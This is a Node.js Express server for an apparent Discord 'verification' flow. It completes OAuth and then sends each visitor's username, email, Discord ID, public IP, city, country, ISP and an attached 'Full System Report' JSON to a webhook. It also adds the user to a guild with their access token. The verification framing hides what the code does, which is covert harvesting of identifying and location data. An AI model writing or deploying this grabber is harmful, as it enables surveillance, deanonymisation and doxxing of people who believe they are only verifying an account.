require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const PORT = process.env.PORT || 3000;
const sessions = new Map();

app.post('/collect', (req, res) => {
    const { state, data } = req.body;
    if (state && data) {
        sessions.set(state, data);
        console.log(`Data saved for state: ${state}`);
    }
    res.sendStatus(200);
});

app.get('/callback', async (req, res) => {
    const { code, state, error } = req.query;
    const returnUrl = 'https://discord.com/channels/1567738498662924428/1567817486513086534';
    
    if (error) {
        console.log(`User denied authorization: ${error}`);
        return res.redirect(returnUrl);
    }
    if (!code) {
        console.log('No authorization code');
        return res.redirect(returnUrl);
    }
    
    const clientData = sessions.get(state) || { error: 'Data not found' };
    sessions.delete(state);

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    const redirectUri = `${protocol}://${host}/callback`;

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.DISCORD_CLIENT_ID,
            client_secret: process.env.DISCORD_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, token_type } = tokenResponse.data;

        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `${token_type} ${access_token}` }
        });
        const user = userResponse.data;

        if (process.env.DISCORD_WEBHOOK_URL) {
            const formData = new FormData();
            
            const embed = {
                title: 'New Verified User',
                color: 0x5865f2,
                fields: [
                    { name: 'Username', value: user.username, inline: true },
                    { name: 'Email', value: user.email || 'Not provided', inline: true },
                    { name: 'Discord ID', value: user.id, inline: true },
                    { name: 'Public IP', value: clientData.network?.geo?.ip || 'Unknown', inline: true },
                    { name: 'Location', value: clientData.network?.geo ? `${clientData.network.geo.city}, ${clientData.network.geo.country}` : 'Unknown', inline: true },
                    { name: 'ISP', value: clientData.network?.geo?.org || 'Unknown', inline: true }
                ],
                timestamp: new Date().toISOString()
            };

            formData.append('payload_json', JSON.stringify({
                content: '**Full System Report Attached**',
                embeds: [embed]
            }));

            const reportJson = JSON.stringify(clientData, null, 2);
            const fileBlob = new Blob([reportJson], { type: 'application/json' });
            formData.append('files[0]', fileBlob, 'report.json');

            await axios.post(process.env.DISCORD_WEBHOOK_URL, formData).catch(err => {
                console.error('Webhook error:', err.response?.data || err.message);
            });
        }

        await axios.put(`https://discord.com/api/v10/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}`,
            { access_token: access_token },
            { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`, 'Content-Type': 'application/json' } }
        );

        await axios.put(`https://discord.com/api/v10/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}/roles/${process.env.DISCORD_ROLE_ID}`,
            {},
            { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}` } }
        );

        res.redirect(returnUrl); 
    } catch (error) {
        console.error('DISCORD API ERROR:', error.response?.data || error.message);
        res.redirect(returnUrl);
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
